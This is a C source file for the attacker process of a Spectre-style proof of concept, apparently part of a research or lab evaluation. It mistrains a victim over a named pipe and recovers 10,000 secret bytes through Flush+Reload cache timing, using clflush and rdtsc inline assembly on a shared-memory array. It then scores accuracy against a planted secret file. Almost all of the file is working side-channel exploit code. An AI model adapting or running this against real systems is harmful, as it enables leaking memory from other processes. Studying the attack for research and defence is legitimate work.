#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>     
#include <fcntl.h>           
#include <unistd.h>
#include <string.h>
#include <assert.h>
#include <stdint.h>
#include <time.h>
#include <x86intrin.h>
#include <sched.h>

#define TARGET_ARRAY_LENGTH 256
#define ELEMENT_DISTANCE 512
#define BYTES_TO_BE_READ 10000
#define READ_ITERATIONS 3

const char *shared_mem_name = "/test";
const char *pipe_name = "/tmp/spectre_pipe";
void* timing_array;

void shuffle_array(size_t array[]){
    srand(time(NULL));
    for(int i = TARGET_ARRAY_LENGTH - 1; i > 0; i--){
        size_t random_index = rand() % (i + 1);
        size_t tmp = array[random_index];
        array[random_index] = array[i];
        array[i] = tmp;
    }
    return;
}

void flush_array(void *array_to_flush){
    void* addr_ptr = array_to_flush;
    for(int i = 0; i < TARGET_ARRAY_LENGTH; i++){
        _mm_clflush(addr_ptr);
        addr_ptr += ELEMENT_DISTANCE;
    }
    return;
}

void reload_array(void *array_to_reload, char *extracted_char){
    size_t indices[TARGET_ARRAY_LENGTH];
    for(size_t i = 0; i < TARGET_ARRAY_LENGTH; i++){
        indices[i] = i;
    }
    shuffle_array(indices);
    uint64_t results[TARGET_ARRAY_LENGTH];
    void* addr_ptr;
    size_t current_index;
    for(int i = 0; i < TARGET_ARRAY_LENGTH; i++){
        current_index = indices[i];
        addr_ptr = array_to_reload + current_index * ELEMENT_DISTANCE;
        uint64_t reload_time;
        asm ( 
            "mfence \n"
            "lfence \n"
            "rdtsc \n" 
            "lfence \n"
            "mov %%rax, %%rsi \n"
            "mov (%1), %%al \n"
            "lfence \n"
            "rdtsc \n"
            "sub %%rsi, %%rax\n"
            : "=a" (reload_time)
            : "c" (addr_ptr)
        );
        results[current_index] = reload_time;
    }
    size_t lowest_timing = 1;
    for(int i = 1; i < TARGET_ARRAY_LENGTH; i++){
        //fprintf(result_ptr, "%li %i\n", results[i], i);
        if(results[i] < results[lowest_timing]){
            lowest_timing = i;
        }
    }
    *extracted_char = (char)lowest_timing; 
    return;
}

void create_shared_array(){
    int oflags = O_RDWR | O_CREAT;
	off_t length = TARGET_ARRAY_LENGTH * ELEMENT_DISTANCE;
	int fd = shm_open(shared_mem_name, oflags, 0644);

	ftruncate(fd, length);
	assert(fd>0);
	timing_array = (void*) mmap(NULL, length, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	assert(timing_array);
	close(fd);
}

void create_pipe(){
    mkfifo(pipe_name, 0777);
}

void trigger_victim_calculation(int index){
    int read_buffer;
    int pipe_fd = open(pipe_name, O_WRONLY);
    write(pipe_fd, &index, sizeof(int));
    sched_yield();
    close(pipe_fd);
    pipe_fd = open(pipe_name, O_RDONLY);
    read(pipe_fd, &read_buffer, sizeof(read_buffer));
    close(pipe_fd);
    return;
}

double calculate_accuracy(char *original_bytes, char *extracted_bytes){
    int hits = 0;
    size_t miss_indices[10000] = {0};
    for(int i = 0; i < BYTES_TO_BE_READ; i++){
        if(original_bytes[i] == extracted_bytes[i]){
            hits++;
        }else{
            miss_indices[i-hits] = i;
        }
    } 
    double accuracy = ((float)hits / BYTES_TO_BE_READ) * 100;
    //printf("------ MISS INDICES: ------\n");
    for(int i = 0; i < 10000; i++){
        if(miss_indices[i] != 0){
            //printf("%li: Actual Byte: %i Extracted Byte: %i\n", miss_indices[i], (uint8_t)original_bytes[miss_indices[i]], (uint8_t)extracted_bytes[miss_indices[i]]);
        }
    }
    printf("\n\n");
    return accuracy;
}

int main(int argc, char* argv[]) {
    // printf("--------- Started attacker ---------\n");
	create_shared_array();
    create_pipe();
    char input_buff[100];
    char extracted_string_buffer[10001];
    int index;
    size_t actual_index;
    clock_t begin = clock();
    for(int i = 0; i < BYTES_TO_BE_READ; i++){ 
        flush_array(timing_array);
        for(int j = READ_ITERATIONS - 1; j >= 0; j--){ 
            actual_index = (192 + i) & ~(0xFFFF * (1 && (j % READ_ITERATIONS)));
            for(int k = 0; k < 200; k++){} 
            trigger_victim_calculation(actual_index);
        }
        reload_array(timing_array, &extracted_string_buffer[i]);
    }
    clock_t end = clock();
    double time_spent = (double)(end - begin) / CLOCKS_PER_SEC;
    extracted_string_buffer[10000] = 0x00;
    // Read Secret for calculating accuracy 
    FILE *secret_text = fopen("../secret.txt", "r");
    char secret_text_buffer[10001];
    fgets(secret_text_buffer, 10000, secret_text);
    fclose(secret_text);
    secret_text_buffer[10000] = 0x00;
    double spectre_accuracy = calculate_accuracy(&secret_text_buffer[0], &extracted_string_buffer[0]);
    //printf("Extracted String is: %s\n\nSpectre accuracy was: %f %%\n", &extracted_string_buffer[0], spectre_accuracy);
    printf("\nSpectre accuracy was: %f %%\n", spectre_accuracy);
    FILE *evaluation_file = fopen("../output/evaluation.txt", "a");
    fprintf(evaluation_file, "%f %f\n", spectre_accuracy, time_spent);
	return 0;
}
